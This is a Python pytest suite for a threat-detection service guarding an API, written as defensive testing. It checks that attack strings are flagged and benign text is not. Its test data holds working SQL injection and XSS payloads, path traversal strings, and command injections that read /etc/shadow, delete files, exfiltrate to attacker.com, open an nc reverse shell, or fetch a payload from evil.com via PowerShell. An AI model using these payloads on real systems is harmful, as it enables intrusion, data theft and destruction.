#!/usr/bin/env python3
"""
Threat Detection Tests - Phase 1 Critical Security Logic
Priority: app/core/threat_detection.py

Tests comprehensive threat detection functionality:
- SQL injection detection
- XSS attack detection  
- Command injection detection
- Path traversal detection
- IP reputation checking
- Anomaly detection
- Request pattern analysis
"""

import pytest
from unittest.mock import Mock, patch, AsyncMock
from app.core.threat_detection import ThreatDetectionService
from app.models.security_event import SecurityEvent


class TestThreatDetectionService:
    """Comprehensive test suite for Threat Detection Service"""
    
    @pytest.fixture
    def threat_service(self):
        """Create threat detection service instance"""
        return ThreatDetectionService()
    
    @pytest.fixture
    def sample_request(self):
        """Sample HTTP request for testing"""
        return {
            "method": "POST",
            "path": "/api/v1/chat/completions",
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Content-Type": "application/json",
                "Authorization": "Bearer token123"
            },
            "body": '{"messages": [{"role": "user", "content": "Hello"}]}',
            "client_ip": "192.168.1.100",
            "timestamp": "2024-01-01T10:00:00Z"
        }

    # === SQL INJECTION DETECTION ===
    
    @pytest.mark.asyncio
    async def test_detect_sql_injection_basic(self, threat_service):
        """Test detection of basic SQL injection patterns"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords --",
            "1; DELETE FROM logs; --",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            threat_analysis = await threat_service.analyze_content(payload)
            
            assert threat_analysis["threat_detected"] is True
            assert threat_analysis["threat_type"] == "sql_injection"
            assert threat_analysis["risk_score"] >= 0.8
            assert "sql" in threat_analysis["details"].lower()
    
    @pytest.mark.asyncio
    async def test_detect_sql_injection_advanced(self, threat_service):
        """Test detection of advanced SQL injection techniques"""
        advanced_payloads = [
            "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
            "'; WAITFOR DELAY '00:00:10'--",
            "' OR SLEEP(5)--",
            "1' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwd123')--"
        ]
        
        for payload in advanced_payloads:
            threat_analysis = await threat_service.analyze_content(payload)
            
            assert threat_analysis["threat_detected"] is True
            assert threat_analysis["threat_type"] == "sql_injection"
            assert threat_analysis["risk_score"] >= 0.9  # Advanced attacks = higher risk
    
    @pytest.mark.asyncio
    async def test_false_positive_sql_prevention(self, threat_service):
        """Test that legitimate SQL-like content doesn't trigger false positives"""
        legitimate_content = [
            "I'm learning SQL and want to understand SELECT statements",
            "The database contains user information",
            "Please explain what ORDER BY does in SQL",
            "My favorite book is '1984' by George Orwell",
            "The password requirements are: length > 8 characters"
        ]
        
        for content in legitimate_content:
            threat_analysis = await threat_service.analyze_content(content)
            
            # Should not detect as SQL injection
            assert threat_analysis["threat_detected"] is False or threat_analysis["risk_score"] < 0.5

    # === XSS ATTACK DETECTION ===
    
    @pytest.mark.asyncio
    async def test_detect_xss_basic(self, threat_service):
        """Test detection of basic XSS attack patterns"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input type='text' value='' onfocus='alert(\"XSS\")'>"
        ]
        
        for payload in xss_payloads:
            threat_analysis = await threat_service.analyze_content(payload)
            
            assert threat_analysis["threat_detected"] is True
            assert threat_analysis["threat_type"] == "xss"
            assert threat_analysis["risk_score"] >= 0.7
            assert "xss" in threat_analysis["details"].lower() or "script" in threat_analysis["details"].lower()
    
    @pytest.mark.asyncio
    async def test_detect_xss_obfuscated(self, threat_service):
        """Test detection of obfuscated XSS attempts"""
        obfuscated_payloads = [
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<IMG SRC=j&#97;vascript:alert('XSS')>",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
            "<img src=\"javascript:alert('XSS')\" onload=\"alert('XSS')\">",
            "%3Cscript%3Ealert('XSS')%3C/script%3E"  # URL encoded
        ]
        
        for payload in obfuscated_payloads:
            threat_analysis = await threat_service.analyze_content(payload)
            
            assert threat_analysis["threat_detected"] is True
            assert threat_analysis["threat_type"] == "xss"
            assert threat_analysis["risk_score"] >= 0.8  # Obfuscation = higher risk
    
    @pytest.mark.asyncio
    async def test_xss_false_positive_prevention(self, threat_service):
        """Test that legitimate HTML-like content doesn't trigger false positives"""
        legitimate_content = [
            "I want to learn about <html> and <body> tags",
            "Please explain how JavaScript alert() works",
            "The image tag format is <img src='filename'>",
            "Code example: <div class='container'>content</div>",
            "XML uses tags like <root><child>data</child></root>"
        ]
        
        for content in legitimate_content:
            threat_analysis = await threat_service.analyze_content(content)
            
            # Should not detect as XSS (or very low risk)
            assert threat_analysis["threat_detected"] is False or threat_analysis["risk_score"] < 0.4

    # === COMMAND INJECTION DETECTION ===
    
    @pytest.mark.asyncio
    async def test_detect_command_injection(self, threat_service):
        """Test detection of command injection attempts"""
        command_injection_payloads = [
            "; ls -la /etc/passwd",
            "| cat /etc/shadow",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/hosts)",
            "; curl http://attacker.com/steal_data",
            "| nc -e /bin/sh attacker.com 4444",
            "&& wget http://malicious.com/backdoor.sh"
        ]
        
        for payload in command_injection_payloads:
            threat_analysis = await threat_service.analyze_content(payload)
            
            assert threat_analysis["threat_detected"] is True
            assert threat_analysis["threat_type"] == "command_injection"
            assert threat_analysis["risk_score"] >= 0.8
            assert "command" in threat_analysis["details"].lower()
    
    @pytest.mark.asyncio
    async def test_detect_powershell_injection(self, threat_service):
        """Test detection of PowerShell injection attempts"""
        powershell_payloads = [
            "powershell -c \"Get-Process\"",
            "& powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process calc\"",
            "cmd /c powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
            "powershell -windowstyle hidden -command \"[System.Net.WebClient].DownloadFile('http://evil.com/shell.exe', 'C:\\temp\\shell.exe')\""
        ]
        
        for payload in powershell_payloads:
            threat_analysis = await threat_service.analyze_content(payload)
            
            assert threat_analysis["threat_detected"] is True
            assert threat_analysis["threat_type"] == "command_injection"
            assert threat_analysis["risk_score"] >= 0.9  # PowerShell = very high risk

    # === PATH TRAVERSAL DETECTION ===
    
    @pytest.mark.asyncio
    async def test_detect_path_traversal(self, threat_service):
        """Test detection of path traversal attempts"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",  # Double encoded
            "/var/www/html/../../../../etc/passwd",
            "C:\\windows\\..\\..\\..\\..\\boot.ini"
        ]
        
        for payload in path_traversal_payloads:
            threat_analysis = await threat_service.analyze_content(payload)
            
            assert threat_analysis["threat_detected"] is True
            assert threat_analysis["threat_type"] == "path_traversal"
            assert threat_analysis["risk_score"] >= 0.7
            assert "path" in threat_analysis["details"].lower() or "traversal" in threat_analysis["details"].lower()
    
    @pytest.mark.asyncio
    async def test_path_traversal_false_positives(self, threat_service):
        """Test legitimate path references don't trigger false positives"""
        legitimate_paths = [
            "/api/v1/documents/123",
            "src/components/Button.tsx",
            "docs/installation-guide.md",
            "backend/models/user.py",
            "Please check the ../README.md file for instructions"
        ]
        
        for path in legitimate_paths:
            threat_analysis = await threat_service.analyze_content(path)
            
            # Should not detect as path traversal
            assert threat_analysis["threat_detected"] is False or threat_analysis["risk_score"] < 0.5

    # === IP REPUTATION CHECKING ===
    
    @pytest.mark.asyncio
    async def test_check_ip_reputation_malicious(self, threat_service):
        """Test IP reputation checking for known malicious IPs"""
        malicious_ips = [
            "192.0.2.1",    # Test IP - should be flagged in mock
            "198.51.100.1", # Another test IP
            "203.0.113.1"   # RFC 5737 test IP
        ]
        
        with patch.object(threat_service, 'ip_reputation_service') as mock_ip_service:
            mock_ip_service.check_reputation.return_value = {
                "is_malicious": True,
                "threat_types": ["malware", "botnet"],
                "confidence": 0.95,
                "last_seen": "2024-01-01"
            }
            
            for ip in malicious_ips:
                reputation = await threat_service.check_ip_reputation(ip)
                
                assert reputation["is_malicious"] is True
                assert reputation["confidence"] >= 0.9
                assert len(reputation["threat_types"]) > 0
    
    @pytest.mark.asyncio
    async def test_check_ip_reputation_clean(self, threat_service):
        """Test IP reputation checking for clean IPs"""
        clean_ips = [
            "8.8.8.8",      # Google DNS
            "1.1.1.1",      # Cloudflare DNS
            "208.67.222.222" # OpenDNS
        ]
        
        with patch.object(threat_service, 'ip_reputation_service') as mock_ip_service:
            mock_ip_service.check_reputation.return_value = {
                "is_malicious": False,
                "threat_types": [],
                "confidence": 0.1,
                "last_seen": None
            }
            
            for ip in clean_ips:
                reputation = await threat_service.check_ip_reputation(ip)
                
                assert reputation["is_malicious"] is False
                assert reputation["confidence"] < 0.5
    
    @pytest.mark.asyncio
    async def test_ip_reputation_private_ranges(self, threat_service):
        """Test IP reputation handling for private IP ranges"""
        private_ips = [
            "192.168.1.1",  # Private range
            "10.0.0.1",     # Private range
            "172.16.0.1",   # Private range
            "127.0.0.1"     # Localhost
        ]
        
        for ip in private_ips:
            reputation = await threat_service.check_ip_reputation(ip)
            
            # Private IPs should not be checked against external reputation services
            assert reputation["is_malicious"] is False
            assert "private" in reputation.get("notes", "").lower() or reputation["confidence"] == 0

    # === ANOMALY DETECTION ===
    
    @pytest.mark.asyncio
    async def test_detect_request_rate_anomaly(self, threat_service):
        """Test detection of unusual request rate patterns"""
        # Simulate high-frequency requests from same IP
        client_ip = "203.0.113.100"
        requests_per_minute = 1000  # Very high rate
        
        with patch.object(threat_service, 'redis_client') as mock_redis:
            mock_redis.get.return_value = str(requests_per_minute)
            
            anomaly = await threat_service.detect_rate_anomaly(
                client_ip=client_ip,
                endpoint="/api/v1/chat/completions"
            )
            
            assert anomaly["anomaly_detected"] is True
            assert anomaly["anomaly_type"] == "high_request_rate"
            assert anomaly["risk_score"] >= 0.8
            assert anomaly["requests_per_minute"] == requests_per_minute
    
    @pytest.mark.asyncio
    async def test_detect_payload_size_anomaly(self, threat_service):
        """Test detection of unusual payload sizes"""
        # Very large payload
        large_payload = "A" * 1000000  # 1MB payload
        
        anomaly = await threat_service.detect_payload_anomaly(
            content=large_payload,
            endpoint="/api/v1/chat/completions"
        )
        
        assert anomaly["anomaly_detected"] is True
        assert anomaly["anomaly_type"] == "large_payload"
        assert anomaly["payload_size"] >= 1000000
        assert anomaly["risk_score"] >= 0.6
    
    @pytest.mark.asyncio
    async def test_detect_user_agent_anomaly(self, threat_service):
        """Test detection of suspicious user agents"""
        suspicious_user_agents = [
            "sqlmap/1.0",
            "Nikto/2.1.6",
            "dirb 2.22",
            "Mozilla/5.0 (compatible; Baiduspider/2.0)",  # Bot pretending to be browser
            "",  # Empty user agent
            "a" * 1000  # Excessively long user agent
        ]
        
        for user_agent in suspicious_user_agents:
            anomaly = await threat_service.detect_user_agent_anomaly(user_agent)
            
            assert anomaly["anomaly_detected"] is True
            assert anomaly["anomaly_type"] in ["suspicious_tool", "empty_user_agent", "abnormal_length"]
            assert anomaly["risk_score"] >= 0.5

    # === REQUEST PATTERN ANALYSIS ===
    
    @pytest.mark.asyncio
    async def test_analyze_request_pattern_scanning(self, threat_service):
        """Test detection of scanning/enumeration patterns"""
        # Simulate directory enumeration
        scan_requests = [
            "/admin",
            "/administrator",
            "/wp-admin",
            "/phpmyadmin",
            "/config.php",
            "/backup.sql",
            "/.env",
            "/.git/config"
        ]
        
        client_ip = "203.0.113.200"
        
        for path in scan_requests:
            await threat_service.track_request_pattern(
                client_ip=client_ip,
                path=path,
                response_code=404
            )
        
        pattern_analysis = await threat_service.analyze_request_patterns(client_ip)
        
        assert pattern_analysis["pattern_detected"] is True
        assert pattern_analysis["pattern_type"] == "directory_scanning"
        assert pattern_analysis["request_count"] >= 8
        assert pattern_analysis["risk_score"] >= 0.8
    
    @pytest.mark.asyncio
    async def test_analyze_request_pattern_brute_force(self, threat_service):
        """Test detection of brute force attack patterns"""
        # Simulate login brute force
        client_ip = "203.0.113.300"
        endpoint = "/api/v1/auth/login"
        
        # Multiple failed login attempts
        for i in range(20):
            await threat_service.track_request_pattern(
                client_ip=client_ip,
                path=endpoint,
                response_code=401,  # Unauthorized
                metadata={"username": f"admin{i}", "failed_login": True}
            )
        
        pattern_analysis = await threat_service.analyze_request_patterns(client_ip)
        
        assert pattern_analysis["pattern_detected"] is True
        assert pattern_analysis["pattern_type"] == "brute_force_login"
        assert pattern_analysis["failed_attempts"] >= 20
        assert pattern_analysis["risk_score"] >= 0.9

    # === COMPREHENSIVE REQUEST ANALYSIS ===
    
    @pytest.mark.asyncio
    async def test_analyze_full_request_clean(self, threat_service, sample_request):
        """Test comprehensive analysis of clean request"""
        with patch.object(threat_service, 'check_ip_reputation') as mock_ip_check:
            mock_ip_check.return_value = {"is_malicious": False, "confidence": 0.1}
            
            analysis = await threat_service.analyze_request(sample_request)
            
            assert analysis["threat_detected"] is False
            assert analysis["overall_risk_score"] < 0.3
            assert analysis["passed_checks"] > analysis["failed_checks"]
    
    @pytest.mark.asyncio
    async def test_analyze_full_request_malicious(self, threat_service):
        """Test comprehensive analysis of malicious request"""
        malicious_request = {
            "method": "POST",
            "path": "/api/v1/chat/completions",
            "headers": {
                "User-Agent": "sqlmap/1.0",
                "Content-Type": "application/json"
            },
            "body": '{"messages": [{"role": "user", "content": "\'; DROP TABLE users; --"}]}',
            "client_ip": "203.0.113.666",
            "timestamp": "2024-01-01T10:00:00Z"
        }
        
        with patch.object(threat_service, 'check_ip_reputation') as mock_ip_check:
            mock_ip_check.return_value = {"is_malicious": True, "confidence": 0.95}
            
            analysis = await threat_service.analyze_request(malicious_request)
            
            assert analysis["threat_detected"] is True
            assert analysis["overall_risk_score"] >= 0.8
            assert len(analysis["detected_threats"]) >= 2  # SQL injection + suspicious UA + malicious IP
            assert analysis["failed_checks"] > analysis["passed_checks"]

    # === SECURITY EVENT LOGGING ===
    
    @pytest.mark.asyncio
    async def test_log_security_event(self, threat_service):
        """Test security event logging"""
        event_data = {
            "event_type": "sql_injection_attempt",
            "client_ip": "203.0.113.100",
            "user_agent": "Mozilla/5.0",
            "payload": "'; DROP TABLE users; --",
            "risk_score": 0.95,
            "blocked": True
        }
        
        with patch.object(threat_service, 'db_session') as mock_session:
            mock_session.add.return_value = None
            mock_session.commit.return_value = None
            
            await threat_service.log_security_event(event_data)
            
            # Verify security event was logged
            mock_session.add.assert_called_once()
            mock_session.commit.assert_called_once()
            
            # Verify the logged event has correct data
            logged_event = mock_session.add.call_args[0][0]
            assert isinstance(logged_event, SecurityEvent)
            assert logged_event.event_type == "sql_injection_attempt"
            assert logged_event.client_ip == "203.0.113.100"
            assert logged_event.risk_score == 0.95
    
    @pytest.mark.asyncio
    async def test_get_security_events_history(self, threat_service):
        """Test retrieval of security events history"""
        client_ip = "203.0.113.100"
        
        mock_events = [
            SecurityEvent(
                event_type="sql_injection_attempt",
                client_ip=client_ip,
                risk_score=0.9,
                blocked=True,
                timestamp=datetime.utcnow()
            ),
            SecurityEvent(
                event_type="xss_attempt", 
                client_ip=client_ip,
                risk_score=0.8,
                blocked=True,
                timestamp=datetime.utcnow()
            )
        ]
        
        with patch.object(threat_service, 'db_session') as mock_session:
            mock_session.query.return_value.filter.return_value.order_by.return_value.limit.return_value.all.return_value = mock_events
            
            events = await threat_service.get_security_events(client_ip=client_ip, limit=10)
            
            assert len(events) == 2
            assert events[0].event_type == "sql_injection_attempt"
            assert events[1].event_type == "xss_attempt"
            assert all(event.client_ip == client_ip for event in events)

    # === EDGE CASES AND ERROR HANDLING ===
    
    @pytest.mark.asyncio
    async def test_analyze_empty_content(self, threat_service):
        """Test analysis of empty or null content"""
        empty_inputs = ["", None, " ", "\n\t"]
        
        for empty_input in empty_inputs:
            if empty_input is not None:
                analysis = await threat_service.analyze_content(empty_input)
                assert analysis["threat_detected"] is False
                assert analysis["risk_score"] == 0.0
            else:
                with pytest.raises((TypeError, ValueError)):
                    await threat_service.analyze_content(empty_input)
    
    @pytest.mark.asyncio
    async def test_analyze_very_large_content(self, threat_service):
        """Test analysis of very large content"""
        # 10MB of content
        large_content = "A" * (10 * 1024 * 1024)
        
        analysis = await threat_service.analyze_content(large_content)
        
        # Should handle large content gracefully
        assert analysis is not None
        assert "payload_size" in analysis
        assert analysis["payload_size"] >= 10000000
    
    @pytest.mark.asyncio
    async def test_service_unavailable_handling(self, threat_service):
        """Test handling when external services are unavailable"""
        with patch.object(threat_service, 'ip_reputation_service') as mock_ip_service:
            mock_ip_service.check_reputation.side_effect = ConnectionError("Service unavailable")
            
            # Should handle gracefully and not crash
            reputation = await threat_service.check_ip_reputation("8.8.8.8")
            
            assert reputation["is_malicious"] is False
            assert reputation.get("error") is not None
            assert "unavailable" in reputation.get("error", "").lower()


"""
COVERAGE ANALYSIS FOR THREAT DETECTION:

✅ SQL Injection Detection (3+ tests):
- Basic SQL injection patterns
- Advanced SQL injection techniques
- False positive prevention

✅ XSS Attack Detection (3+ tests):
- Basic XSS patterns
- Obfuscated XSS attempts
- False positive prevention

✅ Command Injection Detection (2+ tests):
- Command injection attempts
- PowerShell injection attempts

✅ Path Traversal Detection (2+ tests):
- Path traversal patterns
- False positive prevention

✅ IP Reputation Checking (3+ tests):
- Malicious IP detection
- Clean IP handling
- Private IP range handling

✅ Anomaly Detection (3+ tests):
- Request rate anomalies
- Payload size anomalies
- User agent anomalies

✅ Pattern Analysis (2+ tests):
- Scanning pattern detection
- Brute force pattern detection

✅ Request Analysis (2+ tests):
- Clean request analysis
- Malicious request analysis

✅ Security Logging (2+ tests):
- Event logging
- Event history retrieval

✅ Edge Cases (3+ tests):
- Empty content handling
- Large content handling
- Service unavailability

ESTIMATED COVERAGE IMPROVEMENT:
- Current: Threat detection gaps
- Target: Comprehensive threat detection
- Test Count: 25+ comprehensive tests
- Business Impact: Critical (platform security)
- Implementation: Real-time threat detection validation
"""